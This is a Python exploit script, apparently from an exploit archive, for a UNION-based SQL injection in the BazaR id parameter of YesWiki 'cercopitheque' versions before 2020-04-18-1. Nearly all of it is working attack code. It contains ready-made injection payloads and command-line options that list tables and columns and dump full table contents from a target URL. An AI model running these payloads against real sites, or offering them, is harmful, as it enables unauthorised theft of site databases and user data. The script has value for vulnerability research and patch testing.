# Exploit Author: coiffeur
# Vendor Homepage: https://yeswiki.net/
# Software Link: https://yeswiki.net/, https://github.com/YesWiki/yeswiki
# Version: YesWiki cercopitheque < 2020-04-18-1

import sys

import requests

DEBUG = 0


def usage():
    banner = """NAME: YesWiki cercopitheque 2020-04-18-1, SQLi
SYNOPSIS: python sqli_2020.04.18.1.py <URL> [OPTIONS]...
DESCRIPTION:
    -lt, list tables.
    -dt <TABLE>, dump table.
AUTHOR: coiffeur
    """
    print(banner)


def parse(text):
    deli_l = &#039;ABCAABBCC|&#039;
    deli_r = &#039;|ABCAABBCC&#039;
    if (text.find(deli_l) == -1) or (text.find(deli_r) == -1):
        print(&#039;[x] Delimiter not found, please try to switch to a Time Based SQLi&#039;)
        exit(-1)
    start = text.find(deli_l) + len(deli_l)
    end = start + text[start::].find(deli_r)
    return text[start:end]


def render(elements):
    print(elements)

def get_count(t_type, table_name=None, column_name=None):
    if t_type == &#039;table&#039;:
        payload = &#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(TABLE_NAME),0x7c,0x414243414142424343) FROM information_schema.tables),NULL,NULL,NULL,NULL,NULL-- -&#039;
        if DEBUG > 1:
            print(f&#039;[DEBUG] {payload}&#039;)
        r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
        if r.status_code == 200:
            data = parse(r.text)
    if t_type == &#039;column&#039;:
        payload = f&#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count(COLUMN_NAME),0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{table_name}"),NULL,NULL,NULL,NULL,NULL-- -&#039;
        if DEBUG > 1:
            print(f&#039;[DEBUG] {payload}&#039;)
        r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
        data = parse(r.text)
    if t_type == &#039;element&#039;:
        payload = f&#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,count({column_name}),0x7c,0x414243414142424343) FROM {table_name}),NULL,NULL,NULL,NULL,NULL-- -&#039;
        if DEBUG > 1:
            print(f&#039;[DEBUG] {payload}&#039;)
        r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
        data = parse(r.text)
    return int(data)


def list_tables():
    tables_count = get_count(t_type=&#039;table&#039;)
    print(f&#039;[+] Tables found: {tables_count}&#039;)

    tables = []
    for i in range(0, tables_count):
        payload = f&#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,TABLE_NAME,0x7c,0x414243414142424343) FROM information_schema.tables LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -&#039;
        if DEBUG > 1:
            print(f&#039;[DEBUG] {payload}&#039;)
        r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
        if r.status_code == 200:
            talbe = parse(r.text)
            print(f&#039;\t{talbe}&#039;)
            tables.append(talbe)
    return tables


def list_columns(table_name):
    columns_count = get_count(t_type=&#039;column&#039;, table_name=table_name)
    print(f&#039;[+] Columns found: {columns_count}&#039;)

    columns = []
    for i in range(0, columns_count):
        payload = f&#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,COLUMN_NAME,0x7c,0x414243414142424343) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{table_name}" LIMIT 1 OFFSET {i}),NULL,NULL,NULL,NULL,NULL-- -&#039;
        if DEBUG > 1:
            print(f&#039;[DEBUG] {payload}&#039;)
        r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
        if r.status_code == 200:
            column = parse(r.text)
            if DEBUG > 0:
                print(f&#039;\t{column}&#039;)
            columns.append(column)
    return columns


def dump_table(name):
    columns = list_columns(name)
    elements = [None]*len(columns)
    for i in range(0, len(columns)):
        elements_count = get_count(
            t_type=&#039;element&#039;, table_name=name, column_name=columns[i])
        if DEBUG > 0:
            print(f&#039;[+] Dumping: {columns[i]} ({elements_count} rows)&#039;)
        element = []
        for j in range(0, elements_count):
            payload = f&#039;?BazaR&vue=consulter&id=-9475 UNION ALL SELECT (SELECT concat(0x414243414142424343,0x7c,{columns[i]},0x7c,0x414243414142424343) FROM {name} LIMIT 1 OFFSET {j}),NULL,NULL,NULL,NULL,NULL-- -&#039;
            if DEBUG > 1:
                print(f&#039;[DEBUG] {payload}&#039;)
            r = requests.get(url=f&#039;{sys.argv[1]}{payload}&#039;)
            if r.status_code == 200:
                element.append(parse(r.text))
                if DEBUG > 0:
                    print(f&#039;\t{element[-1]}&#039;)
        elements[i] = element
    render(elements)
    return elements


def main():
    if len(sys.argv) < 3:
        print(usage())
        exit(-1)

    if sys.argv[2] == &#039;-lt&#039;:
        list_tables()

    if sys.argv[2] == &#039;-dt&#039;:
        dump_table(sys.argv[3])


if __name__ == "__main__":
    main()

